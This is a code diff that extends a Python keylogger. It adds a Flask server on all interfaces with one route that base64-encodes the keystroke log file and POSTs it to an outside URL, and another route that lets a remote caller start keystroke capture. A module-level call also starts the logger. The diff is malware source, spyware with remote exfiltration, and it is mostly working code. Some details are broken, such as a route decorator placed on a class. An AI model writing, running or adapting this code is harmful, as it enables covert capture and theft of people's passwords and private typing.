@@ -3,8 +3,33 @@ from datetime import datetime
 import threading
 from pynput import keyboard
 import time
+from flask import Flask, request
+import requests
+
+app = Flask(__name__)
+
+url = "https://example.com/upload"
 
 
+@app.route('/get_file', methods=['GET'])
+def upload_file():
+    with open("encrypted_logs.txt", "rb") as f:
+        encoded_content = base64.b64encode(f.read()).decode("utf-8")
+    data = {"filename": "encrypted_logs.txt", "content": encoded_content}
+    headers = {"Content-Type": "application/json"}
+    response = requests.post(url, json=data, headers=headers)
+    print(response.text)
+    return 'Data received', 200
+
+
+@app.route('/time_to_run/<value>', methods=['GET'])
+def process(value):
+    print(value)
+    KeyLogger(int(value)).stop_after_time()
+    return "KeyLogger started listening", 200
+
+
+@app.route('/time_to_run', methods=['GET'])
 class KeyLogger:
     def __init__(self, run_time):
         self.run_time = run_time
@@ -84,7 +109,10 @@ class EncryptorDecryptor:
                 print(f"{line[:timestamp_end + 1]} {decrypted_str}")
 
 
-# KeyLogger(1).stop_after_time()
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
+
+KeyLogger(10).stop_after_time()
 
 decrypt = input("Decrypt the file? (y/n): ")
 if decrypt.lower() == 'y':
